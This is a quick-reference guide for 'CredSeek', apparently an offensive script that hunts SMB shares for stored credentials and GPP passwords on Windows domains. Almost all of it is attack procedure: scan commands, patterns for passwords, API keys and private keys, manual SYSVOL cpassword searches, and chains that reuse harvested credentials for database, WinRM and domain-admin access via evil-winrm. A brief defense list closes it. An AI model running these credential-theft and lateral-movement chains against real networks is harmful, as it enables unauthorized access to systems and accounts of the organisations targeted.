# CredSeek Quick Reference

## Basic Commands

```bash
# Simple scan
./credseek.py iplist.txt

# Deep scan (more patterns)
./credseek.py iplist.txt --deep

# With credentials
./credseek.py iplist.txt -u administrator -p Password123 -d CORP

# GPP password extraction
./credseek.py --gpp dclist.txt -u user -p pass -d CORP

# Faster scanning
./credseek.py iplist.txt --threads 20

# JSON output
./credseek.py iplist.txt --json
```

## Common Workflows

```bash
# Quick credential hunt
../smbseek/smbseek.py iplist.txt
./credseek.py smblist.txt

# Full discovery with GPP
../dcseek/dcseek.py iplist.txt
./credseek.py iplist.txt --deep --gpp dclist.txt -u user -p pass -d CORP

# Test extracted credentials
cat found_creds.txt | grep "password=" 
../dbseek/dbseek.py iplist.txt -t
```

## Output Files

| File | Contents |
|------|----------|
| `credlist.txt` | Targets with accessible shares |
| `found_files.txt` | All files matching patterns |
| `found_creds.txt` | Extracted credentials with context |
| `cred_details.txt` | Summary report |
| `cred_details.json` | Machine-readable output |

## Search Patterns

### File Types
- **Passwords**: `*password*.txt`, `*creds*.xlsx`, `*secret*.txt`
- **Configs**: `.env`, `config.php`, `web.config`, `appsettings.json`
- **SSH Keys**: `id_rsa`, `*.pem`, `authorized_keys`
- **Backups**: `*.backup`, `*.bak`, `*.old`
- **Scripts**: `*.ps1`, `*.sh`, `*.py`, `*.bat`
- **Git**: `.git/config`

### Credential Patterns
```
password=value
api_key=value
token=value
jdbc:mysql://user:pass@host
AKIA[A-Z0-9]{16}
-----BEGIN RSA PRIVATE KEY-----
```

## GPP Password Extraction

### Quick GPP Scan
```bash
# Scan Domain Controllers
./credseek.py --gpp dc01.corp.local -u user -p pass -d CORP

# From DC list
./credseek.py --gpp dclist.txt -u user -p pass -d CORP
```

### Manual GPP Check
```bash
# Access SYSVOL
smbclient //dc01/SYSVOL -U user

# Find Groups.xml files
find . -name "Groups.xml" -o -name "ScheduledTasks.xml"

# Look for cpassword attributes
grep -r "cpassword" .
```

### GPP Files to Check
```
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\User\Preferences\Groups\Groups.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

## High-Value Targets

### Shares
- `\\DC\SYSVOL` - GPP passwords
- `\\DC\NETLOGON` - Login scripts
- `\\FileServer\IT_Share` - Admin tools
- `\\FileServer\Backup` - Backup configs
- `\\FileServer\Scripts` - Automation

### Files
- `.env` - Environment variables
- `web.config` - Connection strings
- `database.yml` - DB config
- `id_rsa` - SSH keys
- `Groups.xml` - GPP passwords

## Integration Examples

### Chain 1: Creds → Database
```bash
./credseek.py iplist.txt
grep "db_connection\|mysql\|postgres" found_creds.txt
../dbseek/dbseek.py iplist.txt -t
```

### Chain 2: Creds → WinRM
```bash
./credseek.py iplist.txt -u user -p pass -d CORP
grep "password=" found_creds.txt
../winrmseek/winrmseek.py iplist.txt -t -u extracted_user -p extracted_pass
```

### Chain 3: GPP → Domain Admin
```bash
./credseek.py --gpp dclist.txt -u user -p pass -d CORP
# Check if GPP account is admin
../ldapseek/ldapseek.py dclist.txt -u gpp_user -p gpp_pass
# Connect to DC
evil-winrm -i dc01 -u gpp_admin -p gpp_pass
```

## Filtering Results

```bash
# Find passwords
grep "Type: password" found_creds.txt

# Find API keys
grep "Type: api_key" found_creds.txt

# Find database creds
grep "Type: db_connection" found_creds.txt

# Find SSH keys
grep "id_rsa\|.pem" found_files.txt

# Find GPP passwords
grep "GPP" found_creds.txt

# High-value keywords
grep -i "admin\|root\|sa\|service" found_creds.txt
```

## Common Issues

### No Shares Found
```bash
# Test SMB access
smbclient -L //192.168.1.100 -N

# Use credentials
./credseek.py iplist.txt -u user -p pass -d DOMAIN
```

### GPP Not Working
```bash
# Check you're targeting DCs
../dcseek/dcseek.py iplist.txt

# Use authenticated scan
./credseek.py --gpp dclist.txt -u user -p pass -d CORP

# Manual SYSVOL check
smbclient //dc01/SYSVOL -U user
```

### Slow Performance
```bash
# More threads
./credseek.py iplist.txt --threads 20

# Skip deep mode
./credseek.py iplist.txt  # faster
```

## Tips

✅ **Always check SYSVOL first** - GPP passwords are critical  
✅ **Use domain credentials** - More shares accessible  
✅ **Enable --deep mode** - More comprehensive search  
✅ **Search backup shares** - Often have old configs  
✅ **Check git repositories** - Credentials in .git/config  
✅ **Verify extracted creds** - May be examples/test data  

## Credential Testing

```bash
# Test on databases
mysql -h target -u extracted_user -p extracted_pass
psql -h target -U extracted_user -d database

# Test on WinRM
evil-winrm -i target -u extracted_user -p extracted_pass

# Test on SSH
ssh -i id_rsa user@target

# Test on SMB
smbclient //target/share -U extracted_user%extracted_pass
```

## Defense Recommendations

1. **Remove GPP passwords** - Use `Remove-GPRegistryValue`
2. **Audit SYSVOL** - No cpassword values in XML
3. **Disable null sessions** - `RestrictAnonymous = 2`
4. **Limit share access** - Least privilege
5. **Use secret vaults** - Don't store passwords in files
6. **Rotate credentials** - Change passwords in configs
7. **Monitor access** - Audit sensitive shares

---

**Quick Start:** `./credseek.py iplist.txt --deep`  
**Most Common:** `./credseek.py --gpp dclist.txt -u user -p pass -d CORP`  
**Full Docs:** See README.md
